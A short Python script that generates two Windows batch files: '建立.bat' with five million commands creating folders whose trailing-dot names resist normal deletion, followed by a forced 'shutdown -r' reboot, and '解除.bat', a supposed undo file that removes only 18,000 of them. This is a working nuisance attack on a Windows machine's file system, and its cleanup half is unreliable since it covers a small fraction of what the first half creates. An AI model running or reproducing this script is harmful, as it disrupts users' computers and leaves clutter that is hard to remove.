# -*- coding = utf-8 -*-
# @Time:2024/5/15 14:31
# @Author:ck
# @File:建立&解除
# @Software:PyCharm
from tqdm import *
c=0
for i in tqdm(range(1000)):
    for a in range(5000):
        b=open('建立.bat','a+')
        b.write('MD %s..'%c+'\\''\n')
        c+=1
b.write('shutdown -r')
b.close()


from tqdm import *
c=0
for i in tqdm(range(90)):
    for a in range(200):
        b=open('解除.bat','a+')
        b.write('RD %s..'%c+'\\''\n')
        c+=1